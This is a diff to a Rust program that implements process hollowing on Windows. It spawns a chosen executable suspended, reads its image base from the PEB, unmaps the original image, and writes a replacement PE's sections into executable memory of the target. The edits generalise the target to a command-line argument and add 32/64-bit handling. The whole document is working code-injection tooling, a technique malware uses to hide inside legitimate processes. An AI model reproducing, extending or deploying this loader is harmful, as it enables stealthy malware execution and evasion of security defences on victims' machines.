@@ -5,11 +5,12 @@ use std::{
     mem::zeroed,
     ops::Add,
     ptr::null_mut,
+    str::from_utf8,
 };
 
 use windows_sys::{
     Wdk::System::{
-        Memory::NtUnmapViewOfSection,
+        Memory::{NtUnmapViewOfSection, ZwUnmapViewOfSection},
         Threading::{NtQueryInformationProcess, ProcessWin32kSyscallFilterInformation},
     },
     Win32::System::{
@@ -20,11 +21,17 @@ use windows_sys::{
         Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
         SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
         Threading::{
-            CREATE_SUSPENDED, CreateProcessA, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
+            CREATE_SUSPENDED, CreateProcessA, PEB, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
             ResumeThread, STARTUPINFOA,
         },
     },
 };
+
+fn pause() {
+    println!("Press Enter to continue...");
+    let mut input = String::new();
+    std::io::stdin().read_line(&mut input).unwrap();
+}
 
 fn main() {
     let args = std::env::args().collect::<Vec<String>>();
@@ -71,7 +78,8 @@ fn main() {
         return;
     }
 
-    let proc_name = "C:\\Windows\\System32\\notepad.exe\0";
+    // let proc_name = "C:\\Windows\\System32\\notepad.exe\0";
+    let proc_name = CString::new(args.get(1).unwrap().as_str()).unwrap();
 
     unsafe {
         let mut si = zeroed::<STARTUPINFOA>();
@@ -97,9 +105,11 @@ fn main() {
 
         println!("[+] Created suspended process with PID: {}", pi.dwProcessId);
 
+        // pause();
+
         let mut pbi = zeroed::<PROCESS_BASIC_INFORMATION>();
         let mut return_length = 0;
-        let mut status = NtQueryInformationProcess(
+        let status = NtQueryInformationProcess(
             pi.hProcess,
             0,
             &mut pbi as *mut _ as *mut _,
@@ -112,11 +122,33 @@ fn main() {
             return;
         }
 
-        let mut base_addr = 0;
+        let dos2 = buffer2.as_ptr() as *const IMAGE_DOS_HEADER;
+        if (*dos2).e_magic != IMAGE_DOS_SIGNATURE {
+            println!("[-] Invalid DOS signature in target process");
+            return;
+        }
+
+        let nt_hdr = (buffer2.as_ptr()).add((*dos2).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
+        if (*nt_hdr).Signature != IMAGE_NT_SIGNATURE {
+            println!("[-] Invalid NT signature in target process");
+            return;
+        }
+
+        let machine = (*nt_hdr).FileHeader.Machine;
+        let peb_offset = if machine == 0x8664 {
+            0x10
+        } else if machine == 0x014c {
+            0x8
+        } else {
+            println!("[-] Unsupported architecture");
+            return;
+        };
+
+        let mut base_addr: usize = 0;
         let mut bytes_read = 0;
         if ReadProcessMemory(
             pi.hProcess,
-            (pbi.PebBaseAddress as usize + 0x10) as *const _,
+            (pbi.PebBaseAddress as usize + peb_offset) as *const _,
             &mut base_addr as *mut _ as *mut _,
             size_of::<usize>() as usize,
             &mut bytes_read,
@@ -126,9 +158,15 @@ fn main() {
             return;
         }
 
+        println!(
+            "[+] Base address of target process: {:016x}",
+            base_addr as u64
+        );
+        // pause();
+
         let status = NtUnmapViewOfSection(pi.hProcess, base_addr as *const _);
         if status != 0 {
-            println!("[-] Failed to unmap view of section");
+            println!("[-] Failed to unmap view of section: {:0X}", status);
             return;
         }
 
@@ -185,14 +223,14 @@ fn main() {
             as *const IMAGE_SECTION_HEADER;
 
         for i in 0..number_of_sections {
-            let sec_name =
-                CString::from_raw((*first_section.add(i as usize)).Name.as_ptr() as *mut i8)
-                    .into_string()
-                    .unwrap();
-
-            println!("[+] Writing section {} to target process", sec_name);
-
             let section = first_section.add(i as usize);
+
+            let name = from_utf8(&(*section).Name)
+                .unwrap()
+                .trim_matches(char::from(0));
+
+            println!("[+] Writing section {} to target process", name);
+
             let virtual_addr = (*section).VirtualAddress;
             let size_of_raw_data = (*section).SizeOfRawData;
             let pointer_to_raw_data = (*section).PointerToRawData;
@@ -209,7 +247,7 @@ fn main() {
                 &mut bytes_written,
             ) == 0
             {
-                println!("[-] Failed to write section {} to target process", sec_name);
+                println!("[-] Failed to write section {} to target process", name);
                 return;
             }
         }
